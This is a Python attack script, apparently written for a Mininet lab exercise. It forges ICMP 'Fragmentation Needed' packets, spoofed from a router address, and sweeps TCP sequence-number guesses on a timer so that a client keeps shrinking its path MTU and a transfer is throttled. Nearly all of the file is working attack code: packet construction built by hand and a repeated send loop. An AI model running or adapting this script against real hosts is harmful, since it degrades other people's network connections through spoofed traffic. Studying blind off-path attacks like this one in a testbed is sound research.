#!/usr/bin/env python3
"""
Attack 2a - Blind Throughput-Reduction via ICMP Fragmentation-Needed (PMTU shrink)

Configured for the Mininet topology in topo.py:

    client   = 10.0.1.1
    server   = 10.0.2.1
    attacker = 10.0.3.1
    router   = 10.0.1.254  (r's client-facing interface - spoofed as the
                            source, since a real PMTU "Fragmentation Needed"
                            message legitimately comes from an on-path
                            router, not the server - see the design report's
                            Attack 2a timing diagram)

Same off-path/blind assumption as attack1_reset.py: the attacker forges an
ICMP Destination Unreachable / Fragmentation Needed message embedding the
victim connection's 4-tuple (+ a guessed sequence number) without ever
sniffing real client<->server traffic. This is a "soft" error - it doesn't
kill the connection, it forces the client to shrink its assumed Path MTU,
increasing per-byte overhead and reducing effective throughput.

Correction vs. the design report: in the actual kernel source
(net/ipv4/tcp_ipv4.c, tcp_v4_err()), the in-window sequence check
(between(seq, snd_una, snd_nxt)) runs BEFORE the switch on ICMP type/code,
so it gates ICMP_FRAG_NEEDED exactly the same as the hard errors Attack 1
uses - "soft errors skip the window check" does not hold for this kernel.
So, like attack1_reset.py, this sweeps the sequence space instead of using
one fixed guess - and repeats every INTERVAL seconds since a single round
doesn't sustain the degradation for the whole transfer.

Usage (matches attack1_reset.py's no-argument style, with optional overrides):
    python3 attack2_pmtu.py [duration_s] [target_mtu] [interval_s]
"""

import struct
import sys
import time

from scapy.all import IP, TCP, Raw, send, conf, checksum


# ============================================================
# Mininet configuration - must match topo.py / attack1_reset.py
# ============================================================

CLIENT_IP = "10.0.1.1"
SERVER_IP = "10.0.2.1"
ROUTER_IP = "10.0.1.254"

CLIENT_PORT = 40000
SERVER_PORT = 5201

DURATION = int(sys.argv[1]) if len(sys.argv) > 1 else 10
TARGET_MTU = int(sys.argv[2]) if len(sys.argv) > 2 else 555
INTERVAL = float(sys.argv[3]) if len(sys.argv) > 3 else 1.0

# Same spacing attack1_reset.py uses.
ASSUMED_WINDOW = 2_600_000
SEQ_SPACE = 2 ** 32
NUM_GUESSES = max(1, SEQ_SPACE // ASSUMED_WINDOW)


# ============================================================
# Basic checks
# ============================================================

print("[*] Attack configuration:")
print("    Client     :", CLIENT_IP)
print("    Server     :", SERVER_IP)
print("    Spoofed src:", ROUTER_IP, "(router)")
print("    Client port:", CLIENT_PORT)
print("    Server port:", SERVER_PORT)
print("    Target MTU :", TARGET_MTU)
print("    Duration   :", DURATION, "s, every", INTERVAL, "s")
print("    Guesses/round:", NUM_GUESSES)

route = conf.route.route(CLIENT_IP)
print("[*] Route to client:")
print("    interface:", route[0])
print("    gateway  :", route[2])
print("    source   :", route[1])

if route[0] == "lo":
    raise RuntimeError(
        "Scapy is routing the attack toward loopback. "
        "Check the Mininet attacker namespace/network."
    )


# ============================================================
# Build one forged "Fragmentation Needed" ICMP packet for a given seq guess
# ============================================================

def build_packet(seq):
    offending = (
        IP(src=CLIENT_IP, dst=SERVER_IP, proto=6)
        /
        TCP(sport=CLIENT_PORT, dport=SERVER_PORT, flags="A", seq=seq, ack=0)
    )
    offending_bytes = bytes(offending)

    # RFC 1191 ICMP Frag-Needed body: type(1) code(1) checksum(2)
    # reserved(2)=0 next-hop-MTU(2), then the offending packet. Built by
    # hand (not scapy's ICMP layer) so the wire format doesn't depend on
    # the installed scapy version's field names.
    icmp_hdr = struct.pack("!BBHHH", 3, 4, 0, 0, TARGET_MTU)
    icmp_body = icmp_hdr + offending_bytes
    csum = checksum(icmp_body)
    icmp_hdr = struct.pack("!BBHHH", 3, 4, csum, 0, TARGET_MTU)
    icmp_body = icmp_hdr + offending_bytes

    # Forged ICMP error apparently coming from the router.
    return IP(src=ROUTER_IP, dst=CLIENT_IP, proto=1) / Raw(load=icmp_body)


def build_round():
    return [
        build_packet((i * ASSUMED_WINDOW) % SEQ_SPACE)
        for i in range(NUM_GUESSES)
    ]


# ============================================================
# Send a full sequence-sweep round every INTERVAL seconds, for DURATION
# ============================================================

print(f"[*] Sending {NUM_GUESSES}-packet seq-sweep rounds (MTU={TARGET_MTU}) "
      f"every {INTERVAL}s for {DURATION}s...")

t_start = time.time()
rounds = 0
sent = 0
while time.time() - t_start < DURATION:
    send(build_round(), verbose=False)
    rounds += 1
    sent += NUM_GUESSES
    time.sleep(INTERVAL)

elapsed = time.time() - t_start
print(f"[*] Sent {sent} packets across {rounds} rounds over {elapsed:.1f}s.")
print("[*] Now check the client's PMTU/MSS (ss -tin) and throughput.")
